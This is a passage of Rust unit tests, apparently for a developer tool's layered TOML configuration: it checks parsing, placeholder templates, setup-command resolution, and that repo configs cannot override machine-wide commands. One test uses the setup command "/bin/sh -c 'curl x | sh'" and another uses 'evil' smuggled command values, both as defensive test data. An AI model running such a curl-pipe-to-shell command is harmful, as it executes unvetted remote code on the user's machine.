        assert!(parse_repo("[worktree]\ndev_worker = \"\"\n", "app.toml").unwrap_err().contains("worktree.dev_worker: must not be empty"));
        let shown = describe(&Loaded { machine: PathBuf::from("/c.toml"), repo: None, settings: both });
        assert!(shown.contains("worktree.dev_worker = \"bin/jobs\"  (repo config)\n  A second command"), "{shown}");
        assert!(shown.contains("worktree.dev_url = \"http://localhost:{port}\"  (default)"), "{shown}");
    }

    #[test]
    fn server_and_worker_names_come_from_the_machine_config_only() {
        let machine = parse_machine("[worktree]\nserver_name = \"web\"\n", "machine").unwrap();
        let resolved = settings(&Worktree::default(), &machine);
        assert_eq!(resolved.server_name, Setting { value: "web".to_string(), layer: Layer::Machine });
        assert_eq!(resolved.worker_name, Setting { value: DEFAULT_WORKER_NAME.to_string(), layer: Layer::Default });
        assert!(parse_repo("[worktree]\nserver_name = \"web\"\n", "repo").unwrap_err().contains("lives in config.toml"));
    }

    #[test]
    fn a_setup_command_that_names_a_path_is_checked_against_the_repo_and_an_absolute_one_passes_as_it_is() {
        let dir = std::env::temp_dir().join(format!("kelpie-setup-abs-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        assert_eq!(setup_command_in(Some("/bin/sh -c 'curl x | sh'".to_string()), &dir).as_deref(), Some("/bin/sh -c 'curl x | sh'"), "an absolute program exists whatever the repo; only the machine config layer should carry one");
        assert_eq!(setup_command_in(Some("./bin/prepare".to_string()), &dir), None);
        std::fs::create_dir_all(dir.join("bin")).unwrap();
        std::fs::write(dir.join("bin/prepare"), "").unwrap();
        assert_eq!(setup_command_in(Some("./bin/prepare --fast".to_string()), &dir).as_deref(), Some("./bin/prepare --fast"));
        assert_eq!(setup_command_in(Some("   ".to_string()), &dir).as_deref(), Some("   "), "an empty command is refused by the parser, not here");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_template_refuses_an_empty_or_nested_placeholder_and_keeps_literal_text() {
        let refused = |template: &str| pieces(template).map(|_| ()).unwrap_err();
        assert!(refused("{}").contains("{} is not a placeholder"));
        assert!(refused("{{port}}").contains("{{port} is not a placeholder"));
        assert!(pieces("a } b").is_ok(), "a stray closing brace is text");
        assert!(refused("{port").contains("never closes"));
        assert_eq!(expand("{port}{port}", &Place { worktree: String::new(), repo: String::new(), number: None, port: Some(3) }).as_deref(), Some("33"));
        assert_eq!(expand("literal", &Place { worktree: String::new(), repo: String::new(), number: None, port: None }).as_deref(), Some("literal"));
        assert_eq!(template(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap().as_deref(), Some(""), "whitespace alone is the empty template that turns the link off");
        assert!(text(&"x = \"  \"".parse().unwrap(), "x", "k").unwrap_err().contains("must not be empty"));
    }

    #[test]
    fn the_config_paths_follow_the_environment_variables() {
        let path = path();
        assert!(path.ends_with("config.toml") || std::env::var_os("KELPIE_CONFIG").is_some());
        assert!(dir().ends_with("kelpie"));
    }

    #[test]
    fn a_repo_config_cannot_hold_a_machine_wide_key_under_another_table() {
        for text in ["[worktree]\nnotify_command = \"x\"\n", "[worktree]\nvault_command = \"x\"\n", "[task]\nnotify = \"x\"\n", "[review]\ncommand = \"x\"\n", "[board]\nbacklog = {}\n"] {
            assert!(parse_repo(text, "app.toml").is_err(), "{text}");
        }
        let smuggled = Worktree { vault_command: Some("evil".to_string()), notify_command: Some("evil".to_string()), server_name: Some("x".to_string()), worker_name: Some("y".to_string()), ..Worktree::default() };
        let resolved = settings(&smuggled, &Machine::default());
        assert_eq!(resolved.vault_command.value, None);
        assert_eq!(resolved.notify_command.value, None);
        assert_eq!(resolved.server_name.value, DEFAULT_SERVER_NAME);
        assert_eq!(resolved.worker_name.value, DEFAULT_WORKER_NAME);
    }
}